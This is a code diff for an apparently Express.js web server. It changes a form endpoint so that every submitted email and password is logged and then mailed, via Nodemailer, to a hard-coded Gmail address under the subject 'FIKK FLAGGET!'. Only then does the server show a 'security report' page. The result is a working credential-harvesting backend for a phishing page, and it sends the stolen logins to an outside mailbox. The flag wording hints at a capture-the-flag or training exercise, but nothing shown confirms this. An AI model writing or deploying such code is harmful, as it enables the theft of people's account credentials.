@@ -14,10 +14,34 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Endpoint to handle form submission
-app.post('/send-email', async (req, res) => {
+app.post('/auth', async (req, res) => {
     const { email, password } = req.body;
     console.log(email, password);
-    return res.sendFile(path.join(__dirname, 'public/security_report.html'));
+    // Set up Nodemailer transporter
+    const transporter = nodemailer.createTransport({
+        service: 'gmail', // or any email service you use (e.g., SMTP for Outlook)
+        auth: {
+            user: process.env.EMAIL_USER,
+            pass: process.env.EMAIL_PASS,
+        },
+    });
+
+    // Email options
+    const mailOptions = {
+        from: process.env.EMAIL_USER,
+        to: 'ulrik.hesmyr@gmail.com', // Replace with the recipient's email address
+        subject: 'FIKK FLAGGET!',
+        text: `${email} ${password}`,
+    };
+
+    // Send the email
+    try {
+        await transporter.sendMail(mailOptions);
+        return res.sendFile(path.join(__dirname, 'public/security_report.html'));    
+    } catch (error) {
+        console.error('Error sending email:', error);
+    }
+    
 });
 
 app.post('/submit-report', async (req, res)=>{
